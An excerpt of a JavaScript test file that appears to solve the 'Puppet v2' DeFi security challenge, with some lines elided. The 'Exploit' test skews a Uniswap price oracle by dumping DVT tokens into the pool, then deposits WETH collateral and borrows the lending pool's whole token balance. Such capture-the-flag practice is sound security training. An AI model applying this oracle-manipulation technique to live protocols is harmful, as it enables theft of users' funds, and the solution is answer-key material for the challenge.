...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Exploit", async function () {
    ...
    //To main idea is to manipulate the market again swaping DVT token to the pool and getting WETH

    await this.token
      .connect(attacker)
      .approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);

    const [_, amountOutWETH] = await this.uniswapRouter
      .connect(attacker)
      .getAmountsOut(
    ...
    const totalWETH = await this.lendingPool
      .connect(attacker)
      .calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
    await this.weth
      .connect(attacker)
      .approve(this.lendingPool.address, totalWETH);

    const balanceOfWETH = await this.weth
      .connect(attacker)
      .balanceOf(attacker.address);

    const totalDeposit = totalWETH.sub(balanceOfWETH);

    await this.weth.connect(attacker).deposit({ value: totalDeposit });

    await this.lendingPool
      .connect(attacker)
      .borrow(POOL_INITIAL_TOKEN_BALANCE, { gasLimit: 1e6 });
  });
